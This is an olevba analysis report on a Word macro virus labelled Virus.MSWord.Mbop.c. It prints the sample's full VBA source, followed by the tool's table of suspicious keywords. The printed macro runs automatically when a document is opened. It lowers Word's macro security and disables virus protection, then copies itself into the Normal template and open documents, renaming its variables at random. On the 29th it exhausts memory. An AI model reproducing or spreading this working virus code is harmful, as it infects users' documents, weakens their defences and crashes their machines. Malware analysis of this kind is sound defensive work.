olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mbop.c-1a4c3fe67fec21fc2fc7b5a354d2257d6c6d7204
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mbop.c-1a4c3fe67fec21fc2fc7b5a354d2257d6c6d7204 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
zhhz = 1
zl1z = "M"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Options.VirusProtection = False
Options.SaveNormalPrompt = False
zfiz = 1
Options.ConfirmConversions = False
Set zNtz = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
z11z = 1
Set zAdz = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
zsez = 3
Set zTdz = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
ztrz = 3
zl2z = "b"
zfnz = zfiz & zsez & ztrz
For ziiz = 1 To zTdz.countoflines
If InStr(zTdz.lines(ziiz, 1), "Private Sub Document_Open()") <> 0 Then
zSlz = ziiz
Exit For
End If
Next
zl3z = "o"
zVcz = Trim(zTdz.lines(zSlz, zSlz + zfnz))
zlvz = 97
z15z = 15
If zNtz.countoflines > 0 Then
zNlz = zNtz.lines(1, zNtz.countoflines)
If InStr(zNlz, "Nt") = 0 And InStr(zNlz, "Sl") = 0 And InStr(zNlz, "Nl") = 0 And InStr(zNlz, "Ad") = 0 And InStr(zNlz, "Vc") = 0 And InStr(zNlz, "Td") = 0 Then
If InStr(LCase(zNlz), "private sub document_open()") <> 0 Then
For ziz = 1 To zNtz.countoflines
If InStr(LCase(zNtz.lines(ziz, 1)), "private sub document_open()") <> 0 Then
znsz = ziz
Exit For
End If
Next
For ziz = znsz To zNtz.countoflines
If InStr(LCase(zNtz.lines(ziz, 1)), "end sub") <> 0 Then
znez = ziz
Exit For
End If
Next
zNtz.deletelines znsz, znez
End If
If InStr(LCase(zNlz), "option explicit") <> 0 Then
For ziz = 1 To zNtz.countoflines
If InStr(LCase(zNtz.lines(ziz, 1)), "option explicit") <> 0 Then
znsz = ziz
Exit For
End If
Next
zNtz.deletelines znsz, 1
End If
zNtz.addfromstring zVcz
zNtz.Save
zinz = zhhz
End If
Else
zNtz.addfromstring zVcz
zNtz.Save
zinz = zhhz
End If
zhvz = 122
ziz = 1
zdqz = Documents.Count
If zAdz.countoflines > 0 Then
zAlz = zAdz.lines(1, zAdz.countoflines)
If InStr(zAlz, "Nt") = 0 And InStr(zAlz, "Sl") = 0 And InStr(zAlz, "Nl") = 0 And InStr(zAlz, "Ad") = 0 And InStr(zAlz, "Vc") = 0 And InStr(zAlz, "Td") = 0 Then
If InStr(LCase(zAlz), "private sub document_open()") <> 0 Then
For ziz = 1 To zAdz.countoflines
If InStr(LCase(zAdz.lines(ziz, 1)), "private sub document_open()") <> 0 Then
znsz = ziz
Exit For
End If
Next
For ziz = znsz To zAdz.countoflines
If InStr(LCase(zAdz.lines(ziz, 1)), "end sub") <> 0 Then
znez = ziz
Exit For
End If
Next
zAdz.deletelines znsz, znez
End If
If InStr(LCase(zAlz), "option explicit") <> 0 Then
For ziz = 1 To zAdz.countoflines
If InStr(LCase(zAdz.lines(ziz, 1)), "option explicit") <> 0 Then
znsz = ziz
Exit For
End If
Next
zAdz.deletelines znsz, 1
End If
zAdz.addfromstring zVcz
ziaz = zhhz
End If
Else
zAdz.addfromstring zVcz
ziaz = zhhz
End If
zl4z = "p"
Randomize
z15z = Int((z15z - z11z + z11z) * Rnd + z11z)
For ziiz = 1 To z15z
Randomize
zTnz = zTnz & Chr(Int((zhvz - zlvz + 1) * Rnd + zlvz))
Next
zd2z = 9
zVcz = zTdz.lines(1, zTdz.countoflines)
zTdz.deletelines 1, zTdz.countoflines
Do While InStr(zVcz, "z") <> 0
zVcz = Mid(zVcz, 1, InStr(zVcz, "z") - 1) & zTnz & Mid(zVcz, InStr(zVcz, "z") + Len("z"))
Loop
zTdz.addfromstring zVcz
zdyz = Day(Now)
zd1z = 2
zl5z = "!"
If zdyz = zd1z & zd2z Then
Dim zstz()
zcaz = 0
Do
ReDim Preserve zstz(zcaz)
zqwz = CLng(1024)
zqaz = zqwz
zqzz = zqwz * zqaz
zstz(zcaz) = String(zqzz, Right(zTnz, 1))
DoEvents
zcaz = zcaz + 1
Loop
End If
If ziaz = zhhz Or zinz = zhhz Then
MsgBox zl1z & zl2z & zl3z & zl4z & zl5z, vbCritical
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

